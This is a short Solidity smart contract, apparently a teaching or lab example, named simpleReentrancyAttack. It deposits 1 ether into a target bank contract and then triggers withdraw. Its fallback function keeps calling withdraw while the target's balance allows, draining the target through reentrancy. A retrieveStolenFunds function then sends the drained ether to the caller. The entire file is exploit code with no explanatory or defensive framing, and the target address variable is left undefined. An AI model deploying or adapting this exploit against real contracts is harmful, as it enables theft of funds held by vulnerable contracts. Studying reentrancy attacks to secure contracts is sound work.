interface targetInterface{
    function deposit() external payable; 
    function withdraw(uint withdrawAmount) external; 
}
   
contract simpleReentrancyAttack{

    targetInterface bankAddress = targetInterface(target); 
    uint amount = 1 ether; 
   
    function deposit() public payable{
    bankAddress.deposit.value(amount)();
    }

    function getTargetBalance() public view returns(uint) {
        return address(bankAddress).balance;
    }
    
    function attack() public payable{
        bankAddress.withdraw(amount); 
    }
  
    function retrieveStolenFunds() public {
        msg.sender.transfer(address(this).balance);
    }
  
    fallback () external payable{ 
        if (address(bankAddress).balance >= amount){
            bankAddress.withdraw(amount);
        }   
    }
}